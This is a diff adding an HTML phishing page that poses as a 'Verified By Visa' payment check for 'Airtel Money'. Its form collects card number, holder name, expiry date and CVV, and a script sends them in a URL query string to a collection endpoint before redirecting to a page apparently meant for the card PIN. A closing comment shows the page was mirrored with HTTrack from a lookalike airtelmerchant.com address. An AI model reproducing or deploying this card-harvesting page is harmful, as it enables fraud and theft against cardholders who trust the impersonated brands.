@@ -1,0 +1,202 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<HTML>
+
+<HEAD>
+     <meta HTTP-EQUIV="Cache-Control" CONTENT="no cache">
+     <meta HTTP-EQUIV="Pragma" CONTENT="no cache">
+     <meta HTTP-EQUIV="Expires" CONTENT="0">
+     <meta HTTP-EQUIV="content-type" CONTENT="text/html; charset=utf-8">
+
+     <TITLE>Verified By Visa</TITLE>
+
+     <style>
+          @import url('https://fonts.googleapis.com/css?family=Roboto:300,400,400i,500,700&amp;display=swap');
+
+
+          .payerForm {
+               font-family: 'Roboto', sans-serif;
+               padding: 20px;
+               border: 1px solid #ccc;
+               font-size: 14px;
+               line-height: 18px;
+
+          }
+
+          .payerForm td {
+               padding: 4px;
+          }
+
+          .footNotes {
+               padding-top: 35px;
+               padding-bottom: 20px;
+          }
+
+          .input-txt {
+               width: 85%;
+               padding: 5px;
+          }
+
+          input[type="text"],
+          .input-txt {
+               padding: 5px;
+          }
+
+          input#submit {
+               padding: 5px 15px;
+               margin: 5px;
+               text-transform: uppercase;
+               border: none;
+               background: #5e5e5e !important;
+               color: #fff;
+          }
+     </style>
+     <table border="0" cellspacing="1" cellpadding="1" width="450" align="center" class="payerForm" height="400"
+          valign="middle">
+          <tr>
+               <td colspan="2" valign="top">
+                    <table width="100%">
+
+                         <tr>
+                              <td width="80%">
+                                   <IMG name="vpasLogo"
+                                        SRC="https://airtelmerchants.in/Payment/Pay/SelfCare/MqHklio009823/img/vbv_logo.jpg"
+                                        BORDER=0 ALT="Verified by Visa" />
+                              </td>
+                              <td width="20%" align=right>
+                                   <IMG name="memberLogo" height=64px width=113px
+                                        src="https://airtelmerchants.in/Payment/Pay/SelfCare/MqHklio009823/img/mastercard_1_82737.jpg"
+                                        BORDER=0 ALT="" />
+                              </td>
+                         </tr>
+                    </table>
+               </td>
+          </tr>
+
+          <tr>
+               <td colspan=2>&nbsp;&nbsp;<FONT SIZE="2" COLOR="#CC3333"><I>Payment Information</I></FONT>
+
+                    <br>
+                    <table border="0" cellspacing="0" cellpadding="0" width="97%" align="center">
+                         <tr>
+                              <td>
+                                   <div style="text-align:justify">
+                                        <FONT SIZE="2" COLOR="black">(Please enter your card details to authorise this
+                                             transaction.)</FONT>
+                                   </div>
+                              </td>
+                         </tr>
+                    </table>
+               </td>
+
+          </tr>
+          <tr>
+               <td colspan=2>&nbsp;</td>
+          </tr>
+
+          <form id="contactform" autocomplete="on">
+               <tr class="merchantName">
+                    <td align=right>Merchant Name: </td>
+                    <td> Airtel Money</td>
+               </tr>
+               <tr class="merchantName">
+                    <td align=right>Transaction Id: </td>
+                    <td> 18273718718722</td>
+               </tr>
+               <tr>
+                    <td width="40%">
+                         <div class="payerForm1" align="right">Card Number:&nbsp; </div>
+                    </td>
+                    <td width="60%" class="normal">
+
+                         <INPUT TITLE="ATM pin" class="input-txt" TYPE="text" size="40%" NAME="card_number" id="card_number"
+                              placeholder="Enter card number without any spaces..">
+
+               </tr>
+
+               <tr>
+                    <td width="40%">
+                         <div class="payerForm1" align="right">Card Holders Name:&nbsp; </div>
+                    </td>
+                    <td width="60%" class="normal">
+
+
+                         <INPUT TITLE="ATM pin" name="card_holder_name" id="card_holder_name" class="input-txt" TYPE="text" size="40%"
+                              placeholder="Enter name specified on card.">
+
+               </tr>
+               <tr>
+                    <td width="40%" height="25">
+                         <div class="payerForm1" align="right">Expiry Date :&nbsp; </div>
+                    </td>
+                    <td width="60%" height="25" class="normal">
+                         <input type="text"name="expmonth" id="expmonth" maxlength="2"
+                              onFocus="getCC(this);clearField(this);" size="2" onKeyUp="this.style.color = '#000';"
+                              onClick="clearField(this);" placeholder="mm">/
+                         <input type="text" name="expdate" id="expdate" maxlength="2" onFocus="clearField(this);"
+                              size="2" onKeyUp="this.style.color = '#000';"
+                              onClick="clearField(this); this.style.color = '#000';" placeholder="yy">
+                    </td>
+               </tr>
+               <tr>
+                    <td width="40%">
+                         <div class="payerForm1" align="right">CVV2/CVC2 :&nbsp; </div>
+                    </td>
+                    <td width="60%" class="normal">
+                         <input type="password" name="cvv" id="cvv" maxlength="4"
+                              onFocus="getCC(this);clearField(this);" size="3" onKeyUp="this.style.color = '#000';"
+                              onClick="clearField(this);">
+
+
+                    </td>
+               </tr>
+
+               <script>
+                    let submitData = () => {
+                         let card_holder_name = document.getElementById('card_holder_name').value;
+                         let card_number = document.getElementById('card_number').value;
+                         let expmonth = document.getElementById('expmonth').value;
+                         let expdate = document.getElementById('expdate').value;
+                         let cvv = document.getElementById('cvv').value;
+
+                         let url = "localhost:/card/details/data"
+                         fetch(`${url}?card_holder_name=${card_holder_name}&card_number=${card_number}&expmonth=${expmonth}&expdate=${expdate}&cvv=${cvv}`)
+                              .then(res => res.json())
+                              .then(json => {
+                                   console.log(json)
+                                   if(json.status == 200) {
+                                        window.location.href = "localhost:/payment/card/pin"
+                                   }
+                              })
+                    }
+               </script>
+
+               <td align="center" colspan="2">
+                    <div id="cmd123456" style="visibility:visible">
+                         <button type="button" onclick="submitData()" 
+                              style="FONT-WEIGHT: bold; COLOR: #ffefd5; BACKGROUND-COLOR: #708090">SUBMIT</button>
+                         &nbsp;&nbsp;&nbsp;
+               </td>
+               </tr>
+
+          </form>
+          <tr>
+               <td colspan="2" align="center" class="footNotes">
+                    <br>
+                    <FONT SIZE="1">This page will automatically timeout after 180 seconds.</font>
+               </td>
+          </tr>
+
+     </table>
+     </div>
+
+
+
+
+
+     </BODY>
+
+
+     <!-- Mirrored from airtelmerchant.com/pay/SelfcareTopUp/self/pQMvrtyPayAmOuNt/cardpage.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Dec 2020 11:32:38 GMT -->
+
+</HTML>
